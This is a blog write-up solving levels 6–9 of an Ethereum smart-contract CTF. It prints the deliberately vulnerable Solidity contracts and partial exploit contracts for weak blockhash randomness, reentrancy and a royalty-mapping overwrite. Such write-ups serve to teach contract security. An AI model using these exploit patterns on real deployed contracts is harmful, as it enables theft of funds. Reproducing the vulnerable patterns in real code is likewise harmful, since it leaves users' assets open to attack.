Title: Blockchain CTF Lvl. 6-9
Date: 2018-12-19 10:01
Modified: 2018-12-19 10:01
Category: ctf
Tags: ctf, ethereum, solidity
Slug: blockchain_ctf69
Authors: F3real
Summary: How to solve Blockchain CTF lvl. 6-9

In this post, we will take a look at challenges from 6 to 9.
To solve these challenges we will use [Remix](https://remix.ethereum.org), an online IDE for solidity. It will also enable us to publish new contracts and interact with them (or other preexisting contracts).

Useful tools to analyse contracts for vulnerabilities and bad practices:

* [SmartScan](https://tool.smartdec.net/?)
* [Mythril](https://github.com/ConsenSys/mythril-classic)

In my experience, SmartScan provided better results but both tools are useful to know.

So let's start:

[TOC]

## Lvl 6 Lottery
Let's take a look at the source:

~~~solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Lottery is CtfFramework{
    using SafeMath for uint256;
    uint256 public totalPot;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        totalPot = totalPot.add(msg.value);
    }
    
    function() external payable ctf{
        totalPot = totalPot.add(msg.value);
    }

    function play(uint256 _seed) external payable ctf{
        require(msg.value >= 1 finney, "Insufficient Transaction Value");
        totalPot = totalPot.add(msg.value);
        bytes32 entropy = blockhash(block.number);
        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
        bytes32 guess = keccak256(abi.encodePacked(_seed));
        if(guess==target){
            //winner
            uint256 payout = totalPot;
            totalPot = 0;
            msg.sender.transfer(payout);
        }
    }    
}
~~~

Vulnerability is that the contract is using `block.blockhash(block.number)` as source of entropy.
When a transaction gets executed in the EVM, the blockhash of the block that is being created is still unknown and EVM will always yield zero. Block number only  becomes known when miner picks up a transaction that executes contract code.

Knowing this we see, that our `_seed` should actually only be equal to `keccak256(abi.encodePacked(msg.sender))` (since xor with 0 has no effect).

To win we just need to call function `play` with correct seed and value of 1 finney.

Easy way to get required seed is to deploy test contract just giving back required value:
~~~solidity
    function getSeed() external view{
        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
        return entropy2;
    }  
~~~
Modifer `view` indicates that the function will not alter the storage state in any way.

We can also use javascript to get same result:
~~~javascript
web3.sha3(ourAddressString, {encoding: 'hex'})
~~~

## Lvl 7 Trust Fund

~~~solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract TrustFund is CtfFramework{
    using SafeMath for uint256;
    uint256 public allowancePerYear;
    uint256 public startDate;
    uint256 public numberOfWithdrawls;
    bool public withdrewThisYear;
    address public custodian;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        custodian = msg.sender;
        allowancePerYear = msg.value.div(10);        
        startDate = now;
    }

    function checkIfYearHasPassed() internal{
        if (now>=startDate + numberOfWithdrawls * 365 days){
            withdrewThisYear = false;
        } 
    }

    function withdraw() external ctf{
        require(allowancePerYear > 0, "No Allowances Allowed");
        checkIfYearHasPassed();
        require(!withdrewThisYear, "Already Withdrew This Year");
        if (msg.sender.call.value(allowancePerYear)()){
            withdrewThisYear = true;
            numberOfWithdrawls = numberOfWithdrawls.add(1);
        }
    }
    
    function returnFunds() external payable ctf{
        require(msg.value == allowancePerYear, "Incorrect Transaction Value");
        require(withdrewThisYear==true, "Cannot Return Funds Before Withdraw");
        withdrewThisYear = false;
        numberOfWithdrawls=numberOfWithdrawls.sub(1);
    }
}
~~~

This time we have one of the classic solidity vulnerabilities, reentrancy.
In solidity we have a few different ways to call other contracts:

* `<address>.send(x)`
    Only 2300 Gas is passed for calls to prevent reentrancy. Returns `false` in case of failure.

* `<address>.transfer(x)`
    Only 2300 Gas is passed for calls to prevent reentrancy. In case of failure, it automatically reverts. Equivalent to `require(<address>.send(x));`

* `<address>.call.value(x)()`
    The executed code is given all available gas and is vulnerable to reentrancy.
    We can manually limit amount of gas sent with `<address>.call.value(x).gas(gasAmount)()`

In function `withdraw` we see that the gas limit is not set and that `withdrewThisYear` flag is only being set after call returns.

```text
                Trust Fund     Attacker contract

                +------------+
                |call() +----|-----------+
                |withdraw set|           |
                +------------+           |
                                 +-------v-------+
                      +--------+ | call withdraw |
                      |          +---------------+
                +-----v------+
                |call() +----|-----------+
                |withdraw set|           |
                +------------+           |
                                 +-------v-------+
                      +--------+ | call withdraw |
                      |          +---------------+
                +-----v------+
                |call()      |
                |withdraw set|
                +------------+
```

We can write a contract that will have a fallback function which calls `withdraw()`. This will create a loop, allowing us to withdraw all eth before `withdrewThisYear` gets set.
We just need to pass enough gas in the first call we make to start the loop. For example in my transaction:
```text
Gas Limit: 300000
Gas Used By Transaction: 195406 (65.14%)
Gas Price: 0.000000001 Ether (1 Gwei) 
```
Part of exploit contract:
~~~solidity
    address trustAddr = 0x466802CE70Fba9865AE8Ce9e7a0A480FC84B7917;
    //fallback function
    function() public payable {
        TrustFund trust = TrustFund(trustAddr);
        trust.withdraw();  
    }

    function getTrustMoney() external{
        TrustFund trust = TrustFund(trustAddr);
        trust.withdraw();
    }
~~~
Just don't forget to write withdraw function so you are able to get your eth back.

Also to note, before any contract can interact with CTF contracts we need to add his address to list of allowed. We do it trough `CtfFramework` contract and its `ctf_challenge_add_authorized_senderctf_challenge_add_authorized_sender` function.


## Lvl 8 Heads or Tails

~~~solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract HeadsOrTails is CtfFramework{
    using SafeMath for uint256;
    uint256 public gameFunds;
    uint256 public cost;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        gameFunds = gameFunds.add(msg.value);
        cost = gameFunds.div(10);
    }
    
    function play(bool _heads) external payable ctf{
        require(msg.value == cost, "Incorrect Transaction Value");
        require(gameFunds >= cost.div(2), "Insufficient Funds in Game Contract");
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
            //win
            gameFunds = gameFunds.sub(msg.value.div(2));
            msg.sender.transfer(msg.value.mul(3).div(2));
        }
        else {
            //loser
            gameFunds = gameFunds.add(msg.value);
        }
    }
}
~~~

This time contract is using `block.blockhash(block.number-1)` as a source of entropy which at first looks better.

But this approach is also flawed: an attacker can make an exploit contract with the same random number generating code in order to call the contract via an internal message. The "random" numbers for the two contracts will be the same.

This happens since both calls will be done in the same block. We can write our attack function as follows:

~~~solidity
    function guess() payable external{
        require(msg.value == 0.10 ether, "Incorrect Transaction Value");
        HeadsOrTails headsOrTails = HeadsOrTails(headsOrTailsAddr);
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if (coinFlip == 1) {
            headsOrTails.play.value(msg.value)(true);
        }
        else {
            headsOrTails.play.value(msg.value)(false);
        }
    }
~~~

Don't forget fallback function so our contract can receive eth as well as withdraw function.

## Lvl 9 Record Label

~~~solidity
pragma solidity 0.4.24;

import "../CtfFramework.sol";
import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Royalties{
    using SafeMath for uint256;
    address private collectionsContract;
    address private artist;
    address[] private receiver;
    mapping(address => uint256) private receiverToPercentOfProfit;
    uint256 private percentRemaining;
    uint256 public amountPaid;

    constructor(address _manager, address _artist) public
    {
        collectionsContract = msg.sender;
        artist=_artist;

        receiver.push(_manager);
        receiverToPercentOfProfit[_manager] = 80;
        percentRemaining = 100 - receiverToPercentOfProfit[_manager];
    }

    modifier isCollectionsContract() { 
        require(msg.sender == collectionsContract, "Unauthorized: Not Collections Contract");
        _;
    }

    modifier isArtist(){
        require(msg.sender == artist, "Unauthorized: Not Artist");
        _;
    }

    function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist{
        require(_percent<percentRemaining, "Precent Requested Must Be Less Than Percent Remaining");
        receiver.push(_receiver);
        receiverToPercentOfProfit[_receiver] = _percent;
        percentRemaining = percentRemaining.sub(_percent);
    }

    function payoutRoyalties() public payable isCollectionsContract{
        for (uint256 i = 0; i< receiver.length; i++){
            address current = receiver[i];
            uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);
            amountPaid = amountPaid.add(payout);
            current.transfer(payout);
        }
        msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256("collectRemainingFunds()")));
    }

    function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256){
        uint256 ret = amountPaid;
        amountPaid = 0;
        return ret;
    }

    function () public payable isCollectionsContract{
        payoutRoyalties();
    }
}

contract Manager{
    address public owner;

    constructor(address _owner) public {
        owner = _owner;
    }

    function withdraw(uint256 _balance) public {
        owner.transfer(_balance);
    }

    function () public payable{
        // empty
    }
}

contract RecordLabel is CtfFramework{
    using SafeMath for uint256;
    uint256 public funds;
    address public royalties;

    constructor(address _ctfLauncher, address _player) public payable
        CtfFramework(_ctfLauncher, _player)
    {
        royalties = new Royalties(new Manager(_ctfLauncher), _player);
        funds = funds.add(msg.value);
    }
    
    function() external payable ctf{
        funds = funds.add(msg.value);
    }

    function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf{
        require(_withdrawAmount<=funds, "Insufficient Funds in Contract");
        funds = funds.sub(_withdrawAmount);
        royalties.call.value(_withdrawAmount)();
        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();
        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); 
        msg.sender.transfer(artistPayout);
    }

    function collectRemainingFunds() external payable{
        require(msg.sender == royalties, "Unauthorized: Not Royalties Contract");
    }
}
~~~

Well, this was the strange one, just calling `withdrawFundsAndPayRoyalties` with 1 eth as the amount will clear all balance from the contract and give us win. Bad thing is that we lose 0.8 eth doing it, but that's the easiest way to do it.

The correct way to solve it is to call `addRoyaltyReceiver` with the address of `Manager` contract, and 0 as percent he gets. Since mapping is used to connect addresses to percentages we will overwrite the original 80% with 0%. After this, we can call `withdrawFundsAndPayRoyalties` to get all of the money from the contract.

We can also run analyser on code of this challenge:
```
docker run -v $(pwd):/tmp mythril/myth -x /tmp/RecordLabel.sol --solv 0.4.24
```